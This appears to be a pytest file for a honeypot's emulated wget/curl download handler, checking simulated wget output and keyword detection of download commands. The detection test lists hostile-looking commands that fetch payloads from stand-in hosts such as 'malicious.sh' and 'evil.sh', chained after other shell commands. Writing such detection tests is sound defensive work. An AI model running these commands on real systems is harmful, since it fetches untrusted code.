from unittest.mock import patch, MagicMock

import pytest

from infra.file_download_handler import FileDownloadHandler


class DummyFakeFS:
    def __init__(self):
        self.files = {}

    def create_file(self, path, content):
        self.files[path] = content


class DummySession:
    def __init__(self):
        self.files = {}


from freezegun import freeze_time


@freeze_time("2025-06-19 13:58:02")
@patch("infra.file_download_handler.requests.get")
def test_wget_success(mock_get, tmp_path):
    mock_response = MagicMock()
    mock_response.text = "fake content"
    mock_response.content = b"fake content"
    mock_get.return_value = mock_response

    dummy_fs = DummyFakeFS()
    handler = FileDownloadHandler(fakefs_handler=dummy_fs, download_dir=tmp_path)
    session = {"fs": dummy_fs}

    command = "wget http://example.com/fake.txt"
    response = handler.query(command, session)

    assert dummy_fs.files["/tmp/fake.txt"] == "fake content"
    assert (
        "--2025-06-19 13:58:02--  http://example.com/fake.txt\n"
        "Resolving example.com... done.\r\n"
        "Connecting to example.com|192.0.2.1|:80... connected.\r\n"
        "HTTP request sent, awaiting response... 200 OK\r\n"
        "Length: 12 [text/plain]\r\n"
        "Saving to: ‘fake.txt’\r\n"
        "\n"
        "fake.txt              100%[12/12]   1.21K/s   in 0.01s\r\n"
        "\n"
        "2025-06-19 13:58:02 (1.21 KB/s) - ‘fake.txt’ saved [12/12]"
    ) in response


@pytest.mark.parametrize(
    "cmd",
    [
        "cd /tmp; wget http://malicious.sh",
        "WGET http://1.2.3.4/payload",
        "curl -O http://example.com/file",
        "mkdir test && CuRL http://evil.sh",
    ],
)
def test_file_download_detection(cmd):
    detected = "wget" in cmd.lower() or "curl" in cmd.lower()
    assert detected
